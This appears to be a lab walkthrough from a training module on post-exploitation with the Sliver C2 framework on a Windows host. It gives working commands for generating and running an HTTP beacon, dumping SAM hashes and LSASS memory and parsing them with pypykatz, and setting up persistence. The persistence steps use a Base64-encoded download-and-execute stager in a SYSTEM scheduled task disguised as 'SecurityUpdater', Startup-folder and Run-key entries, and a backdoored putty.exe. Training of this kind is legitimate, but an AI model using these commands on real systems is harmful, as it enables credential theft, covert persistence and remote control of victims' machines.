#### Situational awareness

```powershell
PS C:\Users\eric> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

------------------------------------------------------------------------
admin
Administrator
CHILD\Domain Admins
CHILD\eric
The command completed successfully.
```

```powershell
PS C:\Users\eric> whoami /groups
```
![](Screenshot%202026-11-09%20at%2011.54.31.png)

```powershell
PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1

PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x0
```
#### Getting a beacon

To reduce the size of the implant, we will not use symbol obfuscation because, for educational purposes and simplicity, `Defender` has been disabled in the lab environment.

```sh
sliver > generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows -N http-beacon-9001

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 30s
[*] Implant saved to /home/htb-ac590/http-beacon-9001.exe
```

Once an implant has been generated, we need to start a listener with the `http` command by specifying the IP and the port.

```sh
sliver > http -L 10.10.14.62 -l 9001

[*] Starting HTTP :9001 listener ...
[*] Successfully started job #2
```

After transferring the implant onto the target and on disk, we can proceed to right-click (Run as Administrator) on it to get a beacon.

![](Screenshot%202026-11-09%20at%2012.03.10.png)

Having a beacon run as an Administrator will allow us to use the `getsystem` command in Sliver, which requires a session.

```sh
sliver (http-beacon-9001) > interactive
```

To dump the hashes, either the SAM database or else, we can rely on the installed tools in the armory. One of the tools we will be using is `hashdump`; note that this must be run from a `NT AUTHORITY\SYSTEM` beacon.

```
sliver (http-beacon-9001) > hashdump

sliver (http-beacon-9001) > getsystem


```

In some scenarios, we might need to dump the `LSASS` process using the `procdump` cmdlet in `Sliver`. Before doing so, we must obtain the current process id using `ps -e lsass`. Once obtained, we can proceed with dumping the process and saving it to our system, and then with the help of `pypykatz` to get the hashes.

```sh
sliver (http-beacon) > ps -e lsass

 Pid   Ppid   Owner                 Arch     Executable   Session 
===== ====== ===================== ======== ============ =========
 660   524    NT AUTHORITY\SYSTEM   x86_64   lsass.exe    0
 
sliver (http-beacon) > procdump --pid 660 --save /tmp/lsass.dmp

[*] Process dump stored in: /tmp/lsass.dmp
```

```sh
3kjS@htb[/htb]$ pypykatz lsa minidump /tmp/lsass.dmp 
INFO:pypykatz:Parsing file /tmp/lsass.dmp
FILE: ======== /tmp/lsass.dmp =======
== LogonSession ==
authentication_id 451699 (6e473)
session_id 2
username eric
domainname CHILD
logon_server DC01
logon_time 2023-10-23T17:10:21.839691+00:00
sid S-1-5-21-2749819870-3967162335-1946002573-1122
luid 451699
    == MSV ==
        Username: eric
        Domain: CHILD
        LM: NA
<SNIP>
```
#### Establishing persistence
##### Scheduled Tasks

Establishing persistence using the notorious technique of scheduled tasks can be done in a few ways: using the `execute` cmdlet in Sliver that will execute the given "binary" and command or using `SharPersist`. We will be focusing on the first method using `execute`. By default, `PowerShell` uses `UTF-16LE` as encoding, but that is not always the case, so we must convert our payload to Base64 using the `UTF-16LE` encoding.

```sh
3kjS@htb[/htb]$ echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=
```

With the encoded payload in hand, we will utilize the built-in `schtasks` cmdlet in Windows to create the task. We are going to name the task `SecurityUpdater`, using the `/create`, we are telling the binary to create the following task, `/sc` specifies the schedule frequency, `/mo` specifies the frequency of repeating the task, `/tn` specifies the name of the task, `/tr` specifies the value of the task to be run, and the `/ru` specifies the user context under which the task runs.

```sh
sliver (http-beacon) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=" /ru SYSTEM'
```

Upon visiting the `Task Scheduler`, we see that the task has been successfully added.

![](Assumed%20breach-20261109-121449.png)

##### Logon Activity

Leveraging the logon activity of a user to maintain persistence is one of the methods. In this way, once a user logs in to the operating system, a specific payload is executed, where we can insert a backdoor activity into the `Startup` folder and registry. Each user's Startup folder is in `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`. If we drop a file here, the file will be executed every time the user logs in.

```sh
sliver (http-beacon) > sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/stager.txt\')\" -f \"Edge Updater\" -m add
```

Querying the contents of the mentioned directory, we can see that the file `Edge Updater` has been successfully placed as a `.LNK` file.

```sh
sliver (http-beacon) > ls "C:\Users\eric\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

##### Run and RunOnce

We can also specify which program to run when a user logs in by editing the registry. Depending on the privilege we already have, we can edit the following registry items:

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

```sh
sliver (http-beacon) > sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add
```

We can also use `SharPersist` to list the recently added entries in the registry.

```sh
sliver (http-beacon) > sharpersist -- -t reg -k \"hklmrun\" -m list
```

##### Backdoor

Earlier, we mentioned manipulating binaries to execute a given implant. In this section, we will utilize the functionality of the `backdoor` built-in command in Sliver. Let's assume the user on the target system has installed `PuTTY`, and we have full access to the directory; we can backdoor the binary (`putty.exe`) to execute a shellcode of our choosing. We need to be cautious as it will alter the application's behavior, resulting in cases where the application won't even start. Before we proceed with backdooring the application, we must create a profile in Sliver.

```sh
sliver (http-beacon) > profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode

[*] Saved new implant profile persistence-shellcode

sliver (http-beacon) > http -L 10.10.14.62 -l 9002

[*] Starting HTTP :9002 listener ...
[*] Successfully started job #3


sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"

[*] Uploaded backdoor'd binary to C:\Program Files\PuTTY\putty.exe
```

Every time a user starts or attempts to start PuTTY, we will get a shell; a disclaimer `PuTTY` won't load at all, but we will still get a beacon back.

![](Screenshot%202026-11-09%20at%2012.19.17.png)

